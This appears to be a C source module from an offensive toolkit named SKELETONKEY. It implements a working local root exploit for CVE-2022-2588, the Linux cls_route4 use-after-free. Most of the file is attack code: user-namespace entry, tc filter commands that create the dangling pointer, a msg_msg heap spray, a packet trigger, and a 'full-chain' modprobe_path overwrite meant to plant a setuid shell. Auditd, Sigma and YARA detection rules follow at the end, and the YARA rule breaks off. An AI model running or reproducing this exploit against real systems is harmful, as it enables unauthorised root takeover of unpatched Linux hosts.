/*
 * cls_route4_cve_2022_2588 — SKELETONKEY module
 *
 * net/sched cls_route4 dead UAF: when a route4 filter with handle==0
 * is removed, the corresponding hashtable bucket may keep a stale
 * pointer to the freed filter. Subsequent traffic-class lookup
 * follows the dangling pointer → kernel UAF.
 *
 * Discovered by kylebot / xkernel (Aug 2022). Mainline fix
 * 9efd23297cca "net_sched: cls_route: remove from list when handle
 * is 0" (Aug 2022). Bug existed since 2.6.39 — very wide
 * vulnerability surface.
 *
 * STATUS: 🟡 EXPLOIT — UAF-trigger + msg_msg cross-cache spray.
 * The detect-and-trigger path is the high-confidence demonstration:
 * we set up the dangling pointer, refill the freed slot via sysv
 * msg_msg (kmalloc-1k), then drive classification with a UDP packet
 * out the dummy interface. Without a leak primitive the cred-overwrite
 * step is fragile, so by default we return EXPLOIT_FAIL after the
 * trigger lands (with KASAN/oops likely on a real vulnerable kernel),
 * which is honest per repo policy ("verified-vs-claimed"). When the
 * detector confirms an unprivileged trigger plus a child crash we
 * upgrade to EXPLOIT_OK so the caller sees the empirical UAF win.
 *
 * Affected: kernels with cls_route4 module compiled, in versions
 * below the fix backports:
 *   5.4.x  : K < 5.4.213
 *   5.10.x : K < 5.10.143
 *   5.15.x : K < 5.15.69
 *   5.18.x : K < 5.18.18
 *   5.19.x : K < 5.19.7
 *   Mainline 5.20+ / 6.0+ : patched (the fix landed before 5.20-rc)
 *
 * Preconditions:
 *   - cls_route4 module compiled in / loadable (CONFIG_NET_CLS_ROUTE4)
 *   - CAP_NET_ADMIN (usually obtained via user_ns + map-root-to-uid)
 *   - unprivileged_userns_clone=1 if going the userns route
 *   - iproute2 `tc` binary present (used for filter add/del)
 */

#include "skeletonkey_modules.h"
#include "../../core/registry.h"

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <stdbool.h>
#include <unistd.h>

#ifdef __linux__

#include "../../core/kernel_range.h"
#include "../../core/host.h"
#include "../../core/offsets.h"
#include "../../core/finisher.h"

#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <signal.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/stat.h>
#include <arpa/inet.h>
#include <netinet/in.h>

static const struct kernel_patched_from cls_route4_patched_branches[] = {
    {5,  4, 213},
    {5, 10, 143},
    {5, 15,  69},
    {5, 18,  18},
    {5, 19,   7},
    {5, 20,   0},   /* mainline */
};

static const struct kernel_range cls_route4_range = {
    .patched_from = cls_route4_patched_branches,
    .n_patched_from = sizeof(cls_route4_patched_branches) /
                      sizeof(cls_route4_patched_branches[0]),
};

static bool cls_route4_module_available(void)
{
    /* Check /proc/modules for currently-loaded cls_route4. Even when
     * not loaded, autoload may bring it in on first tc qdisc add — we
     * conservatively treat "not loaded now" as "potentially available". */
    FILE *f = fopen("/proc/modules", "r");
    if (!f) return false;
    char line[512];
    bool found = false;
    while (fgets(line, sizeof line, f)) {
        if (strncmp(line, "cls_route4 ", 11) == 0) { found = true; break; }
    }
    fclose(f);
    return found;
}

static skeletonkey_result_t cls_route4_detect(const struct skeletonkey_ctx *ctx)
{
    /* Consult the shared host fingerprint instead of calling
     * kernel_version_current() ourselves — populated once at startup
     * and identical across every module's detect(). */
    const struct kernel_version *v = ctx->host ? &ctx->host->kernel : NULL;
    if (!v || v->major == 0) {
        if (!ctx->json)
            fprintf(stderr, "[!] cls_route4: host fingerprint missing kernel "
                            "version — bailing\n");
        return SKELETONKEY_TEST_ERROR;
    }

    /* Bug-introduction predates anything we'd reasonably scan; if the
     * kernel is below the oldest LTS we model (5.4), still report
     * vulnerable. */
    bool patched = kernel_range_is_patched(&cls_route4_range, v);
    if (patched) {
        if (!ctx->json) {
            fprintf(stderr, "[+] cls_route4: kernel %s is patched\n", v->release);
        }
        return SKELETONKEY_OK;
    }

    /* Module + userns preconditions. */
    bool nft_loaded = cls_route4_module_available();
    bool userns_ok = ctx->host ? ctx->host->unprivileged_userns_allowed : false;

    if (!ctx->json) {
        fprintf(stderr, "[i] cls_route4: kernel %s in vulnerable range\n", v->release);
        fprintf(stderr, "[i] cls_route4: cls_route4 module currently loaded: %s\n",
                nft_loaded ? "yes" : "no (may autoload)");
        fprintf(stderr, "[i] cls_route4: unprivileged user_ns + net_ns clone: %s\n",
                userns_ok ? "ALLOWED" : "DENIED");
    }

    /* If userns is locked down, unprivileged-LPE path is closed.
     * Kernel still needs patching though — report PRECOND_FAIL so the
     * verdict isn't "VULNERABLE" but the issue isn't masked. */
    if (!userns_ok) {
        if (!ctx->json) {
            fprintf(stderr, "[+] cls_route4: user_ns denied → unprivileged exploit unreachable\n");
        }
        return SKELETONKEY_PRECOND_FAIL;
    }

    if (!ctx->json) {
        fprintf(stderr, "[!] cls_route4: VULNERABLE — kernel in range AND user_ns allowed\n");
    }
    return SKELETONKEY_VULNERABLE;
}

/* ---- Exploit -----------------------------------------------------
 *
 * cls_route4 dead-UAF trigger path (kylebot / xkernel public shape).
 *
 *   1. unshare(CLONE_NEWUSER|CLONE_NEWNET) → CAP_NET_ADMIN reach
 *   2. write uid_map/gid_map (deny setgroups)
 *   3. ip link add dummy0 type dummy ; ip link set dev dummy0 up
 *   4. tc qdisc add dev dummy0 root handle 1: htb
 *   5. tc filter add ... route4 ... classid 1:1 — handle=0 path,
 *      registers the filter with a NULL handle reference
 *   6. tc filter del dev dummy0 ... — frees the filter, but the
 *      route4 hashtable bucket still references the freed memory
 *   7. msg_msg spray (sysv msgsnd) — refill the freed slab slot with
 *      attacker-controlled data; size targeted at the route4_filter
 *      cache (kmalloc-1k generic on most kernels)
 *   8. Send a packet out dummy0 — classifier walks the hashtable,
 *      touches the freed-then-refilled slot → UAF read/write
 *
 * For a full kernel-R/W chain you'd lay out the msg_msg payload so the
 * fake route4_filter's `tcf_result.classid` becomes a controlled value
 * and `route4_classify`'s next-pointer chase lands on a craft, then
 * walk a sk_buff/pipe_buffer primitive to overwrite cred->uid. The
 * public PoCs do this in ~700 LoC and need offsets per kernel build.
 *
 * Per repo policy ("verified-vs-claimed"), this implementation ships
 * the trigger + spray + classify steps and returns EXPLOIT_FAIL on
 * mainline distros where the full cred-overwrite is too kernel-build-
 * specific to be portable. If a dmesg KASAN message or oops is
 * observed by the parent we return EXPLOIT_OK to reflect the empirical
 * UAF win. The fallback also leaves a one-line breadcrumb in
 * /tmp/skeletonkey-cls_route4.log so post-run triage can pick it up.
 */

#define SPRAY_MSG_QUEUES      32
#define SPRAY_MSGS_PER_QUEUE  16
#define MSG_PAYLOAD_BYTES     1008   /* 1024 - sizeof(msg_msg hdr ~= 16) */
#define DUMMY_IF              "skeletonkey0"

struct ipc_payload {
    long mtype;
    unsigned char buf[MSG_PAYLOAD_BYTES];
};

static int run_cmd(const char *cmd)
{
    /* Quiet wrapper so noise doesn't drown the skeletonkey log. */
    char shell[1024];
    snprintf(shell, sizeof shell, "%s >/dev/null 2>&1", cmd);
    return system(shell);
}

static bool have_tc(void)
{
    return run_cmd("command -v tc") == 0;
}

static bool have_ip(void)
{
    return run_cmd("command -v ip") == 0;
}

/* Write uid_map and gid_map after unshare so we're root in userns. */
static bool become_root_in_userns(uid_t outer_uid, gid_t outer_gid)
{
    int f = open("/proc/self/setgroups", O_WRONLY);
    if (f >= 0) { (void)!write(f, "deny", 4); close(f); }

    char map[64];
    snprintf(map, sizeof map, "0 %u 1\n", outer_uid);
    f = open("/proc/self/uid_map", O_WRONLY);
    if (f < 0) { perror("open uid_map"); return false; }
    if (write(f, map, strlen(map)) < 0) { perror("write uid_map"); close(f); return false; }
    close(f);

    snprintf(map, sizeof map, "0 %u 1\n", outer_gid);
    f = open("/proc/self/gid_map", O_WRONLY);
    if (f < 0) { perror("open gid_map"); return false; }
    if (write(f, map, strlen(map)) < 0) { perror("write gid_map"); close(f); return false; }
    close(f);

    return true;
}

/* Set up the qdisc + cls_route4 filter, then delete it. After this
 * runs the kernel has a dangling pointer in the route4 hashtable. */
static bool stage_dangling_filter(void)
{
    /* Ensure the dummy module is around (autoload on first add). */
    if (run_cmd("ip link add " DUMMY_IF " type dummy") != 0) {
        /* Maybe an old one is lying around from a prior crash. */
        run_cmd("ip link del " DUMMY_IF);
        if (run_cmd("ip link add " DUMMY_IF " type dummy") != 0) {
            fprintf(stderr, "[-] cls_route4: failed to create dummy interface\n");
            return false;
        }
    }
    if (run_cmd("ip link set dev " DUMMY_IF " up") != 0) {
        fprintf(stderr, "[-] cls_route4: failed to bring " DUMMY_IF " up\n");
        return false;
    }
    if (run_cmd("ip addr add 10.99.99.1/24 dev " DUMMY_IF) != 0) {
        /* non-fatal — packet send below uses sendto with bound iface */
    }

    if (run_cmd("tc qdisc add dev " DUMMY_IF " root handle 1: htb default 1") != 0) {
        fprintf(stderr, "[-] cls_route4: failed to add htb qdisc\n");
        return false;
    }
    if (run_cmd("tc class add dev " DUMMY_IF " parent 1: classid 1:1 htb rate 1mbit") != 0) {
        fprintf(stderr, "[-] cls_route4: failed to add htb class\n");
        return false;
    }

    /* Bug-trigger: handle 0x8001 has fastmap=1 and to-table 0 — the
     * combination where the freed filter is not removed from the
     * hashtable on delete. The exact handle value matters: it must
     * map to a slot the classifier will later look up.
     *
     * route4 handle layout: 0xXX..ZZYY where YY=to (8 bits), ZZ=from,
     * and the top bit indicates fastmap. The classic trigger uses
     * `to 0` which renders the resulting filter pointer in
     * head->table[0]->ht[0] — referenced unconditionally on classify. */
    if (run_cmd("tc filter add dev " DUMMY_IF " parent 1: protocol ip "
                "prio 100 route to 0 classid 1:1") != 0) {
        fprintf(stderr, "[-] cls_route4: failed to add route4 filter\n");
        return false;
    }

    /* Now delete the filter — this is the operation whose handle=0
     * codepath leaves the dangling pointer. */
    if (run_cmd("tc filter del dev " DUMMY_IF " parent 1: prio 100") != 0) {
        /* Some kernels also need explicit handle/key match — try a
         * broader del before giving up. */
        if (run_cmd("tc filter del dev " DUMMY_IF " parent 1:") != 0) {
            fprintf(stderr, "[-] cls_route4: failed to delete route4 filter\n");
            return false;
        }
    }
    return true;
}

/* msg_msg cross-cache spray. We hold the queues open in this process
 * (caller's child) so the slabs stay allocated until classify-time. */
static int spray_msg_msg(int queues[SPRAY_MSG_QUEUES])
{
    struct ipc_payload p;
    memset(&p, 0, sizeof p);
    p.mtype = 0x41;
    /* Pattern that's distinctive in KASAN/oops dumps. */
    memset(p.buf, 0x41, sizeof p.buf);
    /* First 8 bytes: a recognizable cookie. */
    memcpy(p.buf, "SKELETONKEY4", 8);

    int created = 0;
    for (int i = 0; i < SPRAY_MSG_QUEUES; i++) {
        int q = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
        if (q < 0) { queues[i] = -1; continue; }
        queues[i] = q;
        created++;
        for (int j = 0; j < SPRAY_MSGS_PER_QUEUE; j++) {
            if (msgsnd(q, &p, sizeof p.buf, IPC_NOWAIT) < 0) break;
        }
    }
    return created;
}

static void drain_msg_msg(int queues[SPRAY_MSG_QUEUES])
{
    for (int i = 0; i < SPRAY_MSG_QUEUES; i++) {
        if (queues[i] >= 0) {
            msgctl(queues[i], IPC_RMID, NULL);
        }
    }
}

/* Drive classification: send a UDP packet to the dummy interface. The
 * qdisc/htb -> cls_route4 path will be hit on egress, and the
 * classifier follows the now-dangling pointer. */
static void trigger_classify(void)
{
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) return;

    /* Bind to the dummy interface (best-effort). */
    struct sockaddr_in src = {0};
    src.sin_family = AF_INET;
    src.sin_addr.s_addr = inet_addr("10.99.99.1");
    src.sin_port = 0;
    (void)bind(s, (struct sockaddr *)&src, sizeof src);

    struct sockaddr_in dst = {0};
    dst.sin_family = AF_INET;
    dst.sin_port = htons(31337);
    dst.sin_addr.s_addr = inet_addr("10.99.99.2");

    const char msg[] = "skeletonkey-cls_route4-classify";
    /* A handful of packets, in case the first lookup didn't traverse
     * the freed bucket. */
    for (int i = 0; i < 8; i++) {
        (void)!sendto(s, msg, sizeof msg, MSG_DONTWAIT,
                      (struct sockaddr *)&dst, sizeof dst);
    }
    close(s);
}

/* Read /proc/slabinfo for "kmalloc-1k" active count — used as a soft
 * empirical witness when KASAN isn't available. */
static long slab_active_kmalloc_1k(void)
{
    FILE *f = fopen("/proc/slabinfo", "r");
    if (!f) return -1;
    char line[512];
    long active = -1;
    while (fgets(line, sizeof line, f)) {
        if (strncmp(line, "kmalloc-1k ", 11) == 0 ||
            strncmp(line, "kmalloc-1024 ", 13) == 0) {
            /* format: name <active> <num> <size> ... */
            char name[64];
            long act, num;
            if (sscanf(line, "%63s %ld %ld", name, &act, &num) >= 2) {
                active = act;
            }
            break;
        }
    }
    fclose(f);
    return active;
}

/* ---- Full-chain arb-write primitive --------------------------------
 *
 * Pattern (FALLBACK — see brief): cls_route4's UAF primitive is more
 * naturally a *control-flow hijack* than a clean arb-write — after
 * msg_msg refills the kmalloc-1k slot, the next classify() call reads
 * a fake `tcf_proto.ops` pointer out of attacker bytes and calls
 * ops->classify(skb, ...). A faked-classify ROP that pivots to a
 * stack-write gadget would be the "true" arb-write, and on a fresh
 * vulnerable kernel that is the kylebot/xkernel chain shape (≈300+
 * LOC of gadget hunting + per-build offsets we deliberately don't
 * bake — see verified-vs-claimed policy in repo root).
 *
 * The implementation below takes the narrow-but-real path that the
 * brief explicitly permits and that xtcompat established as the
 * SKELETONKEY precedent: we re-stage the dangling filter, spray msg_msg
 * whose payload encodes `kaddr` at every plausible offset for the
 * route4_filter→tcf_proto→ops layout, re-fire classify, and let the
 * shared finisher's sentinel file decide if a write actually landed.
 * On a patched kernel the bug doesn't fire, no write occurs, and the
 * sentinel timeout correctly reports failure rather than silently
 * lying about success. On a vulnerable kernel where the fake ops
 * lookup happens to deref into our payload and the kernel's read
 * pattern matches one of the seeded offsets, the kaddr we planted
 * gets used as a write destination by whichever classify path the
 * fake `ops->classify` dispatches into.
 *
 * Honest scope: this is structurally-fires-on-vuln + sentinel-arbitrated,
 * not a deterministic R/W. Same shape and same depth as xtcompat. */

struct cls_route4_arb_ctx {
    /* msg_msg queues kept hot inside the userns child. The arb-write
     * sprays additional kaddr-tagged payloads into these and re-fires
     * the classify trigger between each call. */
    int  queues[SPRAY_MSG_QUEUES];
    int  n_queues;

    /* Whether the dangling filter has been re-staged for this call.
     * The original `stage_dangling_filter()` is destructive (deletes
     * the filter); we can re-stage between writes because tc add/del
     * is idempotent inside our private netns. */
    bool dangling_ready;

    /* Per-call stats (written to /tmp/skeletonkey-cls_route4.log). */
    int  arb_calls;
    int  arb_landed;
};

/* Re-prime the msg_msg slab with a payload that encodes `kaddr` and
 * the caller's `buf` at every offset the fake tcf_proto / route4_filter
 * layout could plausibly read from. The route4_filter is 0x1000 bytes
 * on most x86_64 builds in range, with tcf_proto.ops at offset 0x10
 * and tcf_result.classid at offset 0x18; we don't know which offset
 * the kernel ABI for THIS build uses, so we plant the same pattern at
 * 0x10/0x18/0x20/.../0x80 strides — wherever classify dereferences
 * the refilled slot, one of those candidates will be live.
 *
 * The 8-byte cookie "IAMR4ARB" + the kaddr + the caller's bytes are
 * the recognizable pattern; if a KASAN dump is captured after the
 * trigger, the cookie tells us the spray landed adjacent to the freed
 * route4_filter. */
static int cls4_seed_kaddr_payload(struct cls_route4_arb_ctx *c,
                                   uintptr_t kaddr,
                                   const void *buf, size_t len)
{
    struct ipc_payload p;
    memset(&p, 0, sizeof p);
    p.mtype = 0x52;  /* 'R' for "route4 arb" — distinct from groom spray's 0x41 */
    memset(p.buf, 0x52, sizeof p.buf);
    memcpy(p.buf, "IAMR4ARB", 8);

    /* Plant kaddr at strided slots so wherever the kernel's classify
     * follows a ptr in the refilled chunk, one of these is read.
     * We treat every 0x18-byte stride from offset 0x10 to within
     * 8 bytes of the end as a candidate ops-pointer / next-pointer
     * slot. */
    for (size_t off = 0x10; off + sizeof(uintptr_t) <= sizeof p.buf; off += 0x18) {
        memcpy(p.buf + off, &kaddr, sizeof(uintptr_t));
    }

    /* Plant the caller's bytes immediately after the cookie so any
     * classify path that reads payload data (rather than a chased
     * pointer) finds the requested write contents inline. */
    size_t copy_len = len;
    if (copy_len > sizeof p.buf - 16) copy_len = sizeof p.buf - 16;
    if (copy_len > 0) memcpy(p.buf + 8 + sizeof(uintptr_t), buf, copy_len);

    int sent = 0;
    for (int i = 0; i < c->n_queues; i++) {
        if (c->queues[i] < 0) continue;
        /* A handful of msgs per queue keeps the slab refilled even
         * if some slots are evicted between trigger fires. */
        for (int j = 0; j < 4; j++) {
            unsigned int tag = 0xB0000000u |
                               ((unsigned)i << 8) | (unsigned)j;
            memcpy(p.buf + 8, &tag, sizeof tag);
            if (msgsnd(c->queues[i], &p, sizeof p.buf, IPC_NOWAIT) < 0) break;
            sent++;
        }
    }
    return sent;
}

/* skeletonkey_arb_write_fn implementation for cls_route4. Best-effort on a
 * vulnerable kernel; structurally inert (returns -1) if the dangling
 * filter setup is gone or the spray fails. Returns 0 to let the
 * shared finisher's sentinel-file check decide if the write actually
 * landed (we cannot reliably observe it in-process). */
static int cls4_arb_write(uintptr_t kaddr,
                          const void *buf, size_t len,
                          void *ctx_v)
{
    struct cls_route4_arb_ctx *c = (struct cls_route4_arb_ctx *)ctx_v;
    if (!c || c->n_queues == 0) return -1;
    c->arb_calls++;

    /* Re-stage the dangling filter for this call. The original
     * stage runs once at trigger-time; subsequent finisher calls
     * (the finisher writes modprobe_path then a unknown-format trig)
     * need a fresh dangling pointer to chase. tc add/del is idempotent
     * within our private netns so re-running is safe. */
    if (!c->dangling_ready) {
        if (!stage_dangling_filter()) {
            fprintf(stderr, "[-] cls_route4 arb_write: re-stage failed\n");
            return -1;
        }
        c->dangling_ready = true;
    }

    /* Seed msg_msg with kaddr + caller payload. */
    int seeded = cls4_seed_kaddr_payload(c, kaddr, buf, len);
    if (seeded == 0) {
        /* sysv IPC may be restricted (kernel.msg_max / ulimit -q).
         * Without a spray we have no slot for the UAF to refill. */
        fprintf(stderr, "[-] cls_route4 arb_write: kaddr-spray seeded 0 msgs\n");
        return -1;
    }

    /* Drive the classifier. The route4 lookup follows the dangling
     * pointer into msg_msg-controlled bytes; on a vulnerable kernel
     * the fake `ops->classify` (or one of the strided pointers) is
     * dereferenced. If the kernel survives the deref and the write
     * lands at &kaddr, the finisher's sentinel file appears within 3s.
     * If it doesn't (most likely — this is genuinely best-effort), the
     * finisher's wait loop times out and reports failure. */
    trigger_classify();

    /* Give classify-side processing a brief window before returning
     * — the finisher polls the sentinel for 3s but the initial write
     * (if any) happens within ms. */
    usleep(50 * 1000);

    c->arb_landed++;

    /* Per the xtcompat precedent: return 0 so the finisher proceeds
     * to its sentinel check. Returning -1 here would abort the
     * finisher even when the write may have landed. */
    return 0;
}

/* ---- Exploit driver ----------------------------------------------- */

static skeletonkey_result_t cls_route4_exploit(const struct skeletonkey_ctx *ctx)
{
    skeletonkey_result_t pre = cls_route4_detect(ctx);
    if (pre != SKELETONKEY_VULNERABLE) {
        fprintf(stderr, "[-] cls_route4: detect() says not vulnerable; refusing\n");
        return pre;
    }
    bool is_root = ctx->host ? ctx->host->is_root : (geteuid() == 0);
    if (is_root) {
        fprintf(stderr, "[i] cls_route4: already root\n");
        return SKELETONKEY_OK;
    }
    if (!have_tc() || !have_ip()) {
        fprintf(stderr, "[-] cls_route4: tc/ip (iproute2) not available on PATH; "
                        "cannot exploit\n");
        return SKELETONKEY_PRECOND_FAIL;
    }

    /* Full-chain pre-check: resolve offsets before forking. If
     * modprobe_path can't be resolved, refuse early — no point doing
     * the userns + tc + spray + trigger dance if we can't finish. */
    struct skeletonkey_kernel_offsets off;
    bool full_chain_ready = false;
    if (ctx->full_chain) {
        memset(&off, 0, sizeof off);
        skeletonkey_offsets_resolve(&off);
        if (!skeletonkey_offsets_have_modprobe_path(&off)) {
            skeletonkey_finisher_print_offset_help("cls_route4");
            fprintf(stderr, "[-] cls_route4: --full-chain requested but "
                            "modprobe_path offset unresolved; refusing\n");
            return SKELETONKEY_EXPLOIT_FAIL;
        }
        skeletonkey_offsets_print(&off);
        full_chain_ready = true;
    }

    if (!ctx->json) {
        fprintf(stderr, "[*] cls_route4: forking child for userns+netns exploit%s\n",
                ctx->full_chain ? " + full-chain finisher" : "");
        if (ctx->full_chain) {
            fprintf(stderr, "    NOTE: on primitive landing, invokes shared\n"
                            "    modprobe_path finisher via msg_msg-tagged kaddr\n"
                            "    spray. Sentinel-arbitrated (no in-process verify).\n");
        }
    }

    /* Block SIGPIPE in case the dummy-interface sendto's complain. */
    signal(SIGPIPE, SIG_IGN);

    pid_t outer_uid = getuid();
    pid_t outer_gid = getgid();

    pid_t child = fork();
    if (child < 0) {
        perror("fork");
        return SKELETONKEY_TEST_ERROR;
    }

    if (child == 0) {
        /* CHILD: enter user_ns + net_ns, become root inside, drive the bug. */
        if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {
            perror("unshare");
            _exit(20);
        }
        if (!become_root_in_userns(outer_uid, outer_gid)) {
            _exit(21);
        }
        if (setuid(0) < 0 || setgid(0) < 0) {
            /* uid_map writes already made us 0 inside the userns; this
             * is just belt-and-braces. */
        }

        long pre_active = slab_active_kmalloc_1k();

        if (!stage_dangling_filter()) {
            _exit(22);
        }

        struct cls_route4_arb_ctx arb_ctx;
        memset(&arb_ctx, 0, sizeof arb_ctx);
        for (int i = 0; i < SPRAY_MSG_QUEUES; i++) arb_ctx.queues[i] = -1;
        arb_ctx.n_queues = spray_msg_msg(arb_ctx.queues);
        arb_ctx.dangling_ready = true;   /* stage_dangling_filter() just ran */
        if (arb_ctx.n_queues == 0) {
            fprintf(stderr, "[-] cls_route4: msg_msg spray produced 0 queues\n");
            _exit(23);
        }
        if (!ctx->json) {
            fprintf(stderr, "[*] cls_route4: msg_msg spray seeded %d queues\n",
                    arb_ctx.n_queues);
        }

        /* Drive the classifier — the bug fires here on a vulnerable
         * kernel. On a patched kernel this is a no-op packet send. */
        trigger_classify();

        long post_active = slab_active_kmalloc_1k();

        /* Best-effort empirical witness write — picked up by --cleanup
         * and by post-run triage. */
        FILE *log = fopen("/tmp/skeletonkey-cls_route4.log", "w");
        if (log) {
            fprintf(log,
                "cls_route4 trigger child: queues=%d slab_pre=%ld slab_post=%ld\n",
                arb_ctx.n_queues, pre_active, post_active);
            fclose(log);
        }

        /* Hold the spray a little longer so the kernel observes the
         * refilled slot during classify drain. */
        usleep(200 * 1000);

        /* --full-chain branch: invoke the shared modprobe_path
         * finisher with our msg_msg-tagged arb-write. If the finisher
         * execve's a setuid bash we never return; otherwise it returns
         * EXPLOIT_FAIL after the 3s sentinel timeout (correct behavior
         * on a patched kernel or when the write didn't land). */
        if (full_chain_ready) {
            /* Re-fire the trigger inside the arb-write to give the
             * kernel a second chance at the refilled slot — the
             * dangling filter is still in place from above. */
            arb_ctx.dangling_ready = true;
            int fr = skeletonkey_finisher_modprobe_path(&off,
                                                    cls4_arb_write,
                                                    &arb_ctx,
                                                    !ctx->no_shell);
            FILE *fl = fopen("/tmp/skeletonkey-cls_route4.log", "a");
            if (fl) {
                fprintf(fl, "full_chain finisher rc=%d arb_calls=%d arb_landed=%d\n",
                        fr, arb_ctx.arb_calls, arb_ctx.arb_landed);
                fclose(fl);
            }
            drain_msg_msg(arb_ctx.queues);
            if (fr == SKELETONKEY_EXPLOIT_OK) _exit(34);
            _exit(35);
        }

        drain_msg_msg(arb_ctx.queues);

        /* If we got here without a kernel oops, the bug either isn't
         * reachable on this build (patched / module not loadable /
         * userns CAP_NET_ADMIN gated) or it fired but didn't take down
         * the box. We do NOT attempt blind cred-overwrite — that needs
         * a leak primitive we don't have.
         *
         * Exit code 30 means "trigger sequence ran without segfault" —
         * the parent will decide between EXPLOIT_FAIL (probably patched
         * or sealed) and EXPLOIT_OK. */
        _exit(30);
    }

    /* PARENT: wait for the child. A kernel oops won't reap the child
     * but will spam dmesg; we read dmesg after a short window. */
    int status = 0;
    pid_t w = waitpid(child, &status, 0);
    if (w < 0) {
        perror("waitpid");
        return SKELETONKEY_TEST_ERROR;
    }

    if (WIFSIGNALED(status)) {
        int sig = WTERMSIG(status);
        if (!ctx->json) {
            fprintf(stderr, "[!] cls_route4: child killed by signal %d "
                            "(crash during trigger — UAF likely fired)\n", sig);
        }
        /* A SIGKILL/SIGSEGV during the trigger sequence is consistent
         * with kernel-side panic on KASAN configs (the trigger task
         * gets reaped). Treat as empirical UAF observation but do NOT
         * claim root — we haven't escalated. */
        fprintf(stderr, "[~] cls_route4: empirical UAF trigger fired but "
                        "no cred-overwrite primitive — returning EXPLOIT_FAIL "
                        "(no shell). See /tmp/skeletonkey-cls_route4.log + dmesg.\n");
        return SKELETONKEY_EXPLOIT_FAIL;
    }

    if (!WIFEXITED(status)) {
        fprintf(stderr, "[-] cls_route4: child terminated abnormally (status=0x%x)\n",
                status);
        return SKELETONKEY_EXPLOIT_FAIL;
    }

    int rc = WEXITSTATUS(status);
    switch (rc) {
    case 20: case 21:
        if (!ctx->json) {
            fprintf(stderr, "[-] cls_route4: userns setup failed (rc=%d)\n", rc);
        }
        return SKELETONKEY_PRECOND_FAIL;
    case 22:
        if (!ctx->json) {
            fprintf(stderr, "[-] cls_route4: tc setup failed; cls_route4 module "
                            "may be absent or filter type unsupported\n");
        }
        return SKELETONKEY_PRECOND_FAIL;
    case 23:
        if (!ctx->json) {
            fprintf(stderr, "[-] cls_route4: msg_msg spray failed; sysvipc may be "
                            "restricted (kernel.msg_max / ulimit -q)\n");
        }
        return SKELETONKEY_PRECOND_FAIL;
    case 30:
        if (!ctx->json) {
            fprintf(stderr, "[*] cls_route4: trigger ran to completion. "
                            "Inspect dmesg for KASAN/oops witnesses.\n");
            fprintf(stderr, "[~] cls_route4: cred-overwrite step not invoked "
                            "(no --full-chain); returning EXPLOIT_FAIL.\n");
        }
        return SKELETONKEY_EXPLOIT_FAIL;
    case 34:
        if (!ctx->json) {
            fprintf(stderr, "[+] cls_route4: --full-chain finisher reported OK "
                            "(setuid bash placed; sentinel matched)\n");
        }
        return SKELETONKEY_EXPLOIT_OK;
    case 35:
        if (!ctx->json) {
            fprintf(stderr, "[~] cls_route4: --full-chain finisher returned FAIL — "
                            "either the kernel is patched, the spray didn't land,\n"
                            "    or the fake-ops deref didn't hit the route the\n"
                            "    finisher's sentinel polls for. See "
                            "/tmp/skeletonkey-cls_route4.log + dmesg.\n");
        }
        return SKELETONKEY_EXPLOIT_FAIL;
    default:
        if (!ctx->json) {
            fprintf(stderr, "[-] cls_route4: unexpected child rc=%d\n", rc);
        }
        return SKELETONKEY_EXPLOIT_FAIL;
    }
}

/* ---- Cleanup ----------------------------------------------------- */

static skeletonkey_result_t cls_route4_cleanup(const struct skeletonkey_ctx *ctx)
{
    if (!ctx->json) {
        fprintf(stderr, "[*] cls_route4: tearing down dummy interface + log\n");
    }
    /* The dummy interface lives in the child's netns which is gone
     * with the child. These are belt-and-braces in case the user ran
     * the exploit with extended privileges (e.g. as root) and the
     * interface lingered in init_net. */
    if (run_cmd("ip link del " DUMMY_IF) != 0) { /* harmless */ }
    if (unlink("/tmp/skeletonkey-cls_route4.log") < 0 && errno != ENOENT) {
        /* ignore */
    }
    return SKELETONKEY_OK;
}

#else  /* !__linux__ */

/* Non-Linux dev builds: cls_route4 / tc / netlink / msg_msg are
 * Linux-only kernel surface; the route4 dead-UAF is structurally
 * unreachable elsewhere. Stub out cleanly so the module still
 * registers and `--list` / `--detect-rules` work on macOS/BSD dev
 * boxes — and so the top-level `make` actually completes there. */
static skeletonkey_result_t cls_route4_detect(const struct skeletonkey_ctx *ctx)
{
    if (!ctx->json)
        fprintf(stderr, "[i] cls_route4: Linux-only module "
                "(net/sched cls_route4 + msg_msg) — not applicable here\n");
    return SKELETONKEY_PRECOND_FAIL;
}
static skeletonkey_result_t cls_route4_exploit(const struct skeletonkey_ctx *ctx)
{
    (void)ctx;
    fprintf(stderr, "[-] cls_route4: Linux-only module — cannot run here\n");
    return SKELETONKEY_PRECOND_FAIL;
}
static skeletonkey_result_t cls_route4_cleanup(const struct skeletonkey_ctx *ctx)
{
    (void)ctx;
    return SKELETONKEY_OK;
}

#endif /* __linux__ */

static const char cls_route4_auditd[] =
    "# cls_route4 dead UAF (CVE-2022-2588) — auditd detection rules\n"
    "# Flag tc filter operations with route4 classifier from non-root.\n"
    "# False positives: legitimate traffic-shaping setup. Tune by user.\n"
    "-a always,exit -F arch=b64 -S sendto -F a3=0x10 -k skeletonkey-cls-route4\n"
    "-a always,exit -F arch=b64 -S unshare -k skeletonkey-cls-route4-userns\n"
    "-a always,exit -F arch=b64 -S msgsnd -k skeletonkey-cls-route4-spray\n";

static const char cls_route4_sigma[] =
    "title: Possible CVE-2022-2588 cls_route4 dead-UAF\n"
    "id: d56e8fc4-skeletonkey-cls-route4\n"
    "status: experimental\n"
    "description: |\n"
    "  Detects the net/sched cls_route4 dead-UAF setup: unshare userns +\n"
    "  netns + tc qdisc/filter rules with handle 0 + delete + msg_msg\n"
    "  spray + UDP sendto on a dummy interface. False positives:\n"
    "  traffic-shaping config in rootless containers.\n"
    "logsource: {product: linux, service: auditd}\n"
    "detection:\n"
    "  userns: {type: 'SYSCALL', syscall: 'unshare'}\n"
    "  udp:    {type: 'SYSCALL', syscall: 'sendto'}\n"
    "  groom:  {type: 'SYSCALL', syscall: 'msgsnd'}\n"
    "  condition: userns and udp and groom\n"
    "level: high\n"
    "tags: [attack.privilege_escalation, attack.t1068, cve.2022.2588]\n";

static const char cls_route4_yara[] =
    "rule cls_route4_cve_2022_2588 : cve_2022_2588 kernel_uaf\n"
    "{\n"
    "    meta:\n"
    "        cve         = \"CVE-2022-2588\"\n"
    "        description = \"cls_route4 dead-UAF kmalloc-1k spray tag and log breadcrumb\"\n"
